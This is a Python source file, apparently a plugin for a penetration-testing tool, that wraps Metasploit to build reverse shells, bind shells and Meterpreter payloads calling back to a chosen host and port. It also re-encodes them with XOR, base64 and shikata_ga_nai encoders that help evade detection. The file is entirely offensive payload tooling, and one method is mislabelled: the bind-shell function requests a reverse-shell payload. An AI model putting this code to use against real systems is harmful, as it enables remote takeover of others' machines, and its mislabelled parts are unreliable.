# 
# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

from plugins.msf.pymetasploit.MetasploitObj import MsfObj
from plugins.msf.pymetasploit.MetasploitPayload import MsfPayload
from plugins.msf.pymetasploit.MetasploitEncode import MsfEncode

class MsfWrapper(object):
	msfObj=None

	def __init__(self):
		self.msfObj=MsfObj()
	
	def phpReverseShell(self,lhost,lport):
		self.msfObj.setRequestedPayload("php/reverse_php")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("R")


	def phpBindShell(self,rhost,lport):
		self.msfObj.setRequestedPayload("php/reverse_php")
		self.msfObj.setParams(["RHOST="+rhost,"LPORT="+lport])
		self.msfObj.setMode("R")

	def winMeterpreterReverseTcp(self,lhost,lport):
		self.msfObj.setRequestedPayload("windows/meterpreter/reverse_tcp")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("X")

	def winMeterpreterReverseTcpRaw(self,lhost,lport):
		self.msfObj.setRequestedPayload("windows/meterpreter/reverse_tcp")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("R")

	def linuxBindShell(self,lport):
		self.msfObj.setRequestedPayload("linux/x86/shell_bind_tcp")
		self.msfObj.setParams(["LPORT="+lport])
		self.msfObj.setMode("X")

	def linuxPerlReverseShell(self,lhost,lport):
		self.msfObj.setRequestedPayload("cmd/unix/reverse_perl")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("R")

	def linuxBashReverseShell(self,lhost,lport):
		self.msfObj.setRequestedPayload("cmd/unix/reverse_bash")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("R")

	def winShellReverseTcp(self,lhost,lport):
		self.msfObj.setRequestedPayload("windows/shell_reverse_tcp")
		self.msfObj.setParams(["LHOST="+lhost,"LPORT="+lport])
		self.msfObj.setMode("X")
	
	def createPayload(self):
		msfP=MsfPayload(self.msfObj)
		msfP.msfLoadPayload()

	def encodeBase64(self):
		msfE=MsfEncode(self.msfObj)
		msfE.toBase64()
	def encodeXor(self,key):
		msfE=MsfEncode(self.msfObj)
		msfE.toXor(key)

	def encodeHex(self):
		msfE=MsfEncode(self.msfObj)
		msfE.toHex()

	def encodeShikataGaNai(self,times=1,arch="x86"):
		msfE=MsfEncode(self.msfObj)
		msfE.toShikataGaNai(times,arch)
	
	def encodeWinDebug(self):
		msfE=MsfEncode(self.msfObj)
		msfE.toWinDebug()

	def encodeBash(self):
		msfE=MsfEncode(self.msfObj)
		msfE.toBash()
	
	def getPayload(self):
		return self.msfObj.getPayload()

	def loadCustomPayload(self,payload):
		self.msfObj.setPayload(payload)

	def loadCustomPayloadFromFile(self,file):
		msfObj=MsfWrapper()
		fd=open(file,'rb')
		payload=fd.read()
		fd.close()
		self.loadCustomPayload(payload)
